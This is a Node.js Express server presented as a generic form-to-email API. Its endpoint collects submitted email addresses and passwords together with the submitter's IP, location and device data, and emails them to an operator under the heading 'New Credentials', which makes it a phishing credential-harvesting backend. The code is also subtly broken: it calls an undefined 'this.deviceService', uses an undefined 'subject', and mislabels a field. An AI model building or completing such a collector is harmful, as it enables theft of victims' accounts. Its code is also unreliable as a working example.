require("dotenv").config();

const express = require("express");
const cors = require("cors");
const rateLimit = require("express-rate-limit");
const nodemailer = require("nodemailer");

const app = express();
const PORT = Number(process.env.PORT || 3000);

const allowedOrigins = (process.env.ALLOWED_ORIGINS || "")
  .split(",")
  .map(s => s.trim())
  .filter(Boolean);

app.use(cors({
  origin(origin, callback) {
    // Allow tools such as curl/Postman with no Origin header.
    if (!origin || allowedOrigins.length === 0 || allowedOrigins.includes(origin)) {
      return callback(null, true);
    }
    return callback(new Error("Origin not allowed"));
  }
}));

app.use(express.json({ limit: "20kb" }));
app.use(express.urlencoded({ extended: true, limit: "20kb" }));

app.use(rateLimit({
  windowMs: 15 * 60 * 1000,
  limit: 100,
  standardHeaders: true,
  legacyHeaders: false,
  message: { success: false, error: "Too many requests. Please try again later." }
}));

app.get("/health", (_req, res) => {
  res.json({ success: true, message: "Form Email API is running." });
});

function clean(value, max = 2000) {
  if (value === undefined || value === null) return "";
  return String(value).trim().slice(0, max);
}

function escapeHtml(value) {
  return clean(value).replace(/[&<>"']/g, c => ({
    "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#039;"
  }[c]));
}

function getTransporter() {
  if (!process.env.SMTP_HOST || !process.env.SMTP_USER || !process.env.SMTP_PASS) {
    throw new Error("SMTP configuration is missing.");
  }

  return nodemailer.createTransport({
    host: process.env.SMTP_HOST,
    port: Number(process.env.SMTP_PORT || 587),
    secure: String(process.env.SMTP_SECURE).toLowerCase() === "true",
    auth: {
      user: process.env.SMTP_USER,
      pass: process.env.SMTP_PASS
    }
  });
}

app.post("/api/send-form", async (req, res) => {
  try {
    const body = req.body || {};

    // Honeypot: bots often fill hidden fields. Silently accept but don't email.
    if (clean(body.website, 200)) {
      return res.json({ success: true, message: "Form received." });
    }

    
    const email = clean(body.email, 254);
    const password = clean(body.password, 120);
    const source = clean(body.source);
    const { deviceDetails, ipAddr, location } = await this.deviceService.getLoginDeviceInfo(req);


    if (!email || !password) {
      return res.status(400).json({
        success: false,
        error: "email and password are required."
      });
    }

    const emailOk = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
    if (!emailOk) {
      return res.status(400).json({ success: false, error: "Please provide a valid email address." });
    }

    const transporter = getTransporter();

    const text = [
      "New website form submission",
      "",
      `Source: ${source}`,

      `Email: ${email}`,
      `Password: ${password}`,
      "",
      `IP: ${ipAddr}`,
      `Location: ${location}`,
      `Device: ${deviceDetails}`
      
    ].join("\n");

    await transporter.sendMail({
      from: process.env.FROM_NAME
        ? `"${clean(process.env.FROM_NAME, 100)}" <${process.env.SMTP_USER}>`
        : process.env.SMTP_USER,
      to: process.env.TO_EMAIL,
      replyTo: email,
      subject,
      text,
      html: `
        <h2>New Credentials</h2>
        <p><strong>Source:</strong> ${escapeHtml(source)}</p>
        <p><strong>Email:</strong> ${escapeHtml(email)}</p>
        <p><strong>Password:</strong> ${escapeHtml(password)}</p>
        <p><strong>IP:</strong> ${escapeHtml(ipAddr)}</p>
        <p><strong>Location:</strong> ${escapeHtml(location)}</p>
        <p><strong>Location:</strong> ${escapeHtml(deviceDetails)}</p>
        <br>
        <p>"Wisdom begins in wonder. - Socrates"</p>
        
      `
    });

    return res.json({ success: true, message: "Your form was sent successfully." });
  } catch (error) {
    console.error("Email error:", error.message);
    return res.status(500).json({
      success: false,
      error: "The form could not be sent. Please try again later."
    });
  }
});

app.use((err, _req, res, _next) => {
  if (err.message === "Origin not allowed") {
    return res.status(403).json({ success: false, error: "Origin not allowed." });
  }
  console.error(err);
  res.status(500).json({ success: false, error: "Server error." });
});

app.listen(PORT, () => {
  console.log(`Form Email API running on port ${PORT}`);
});
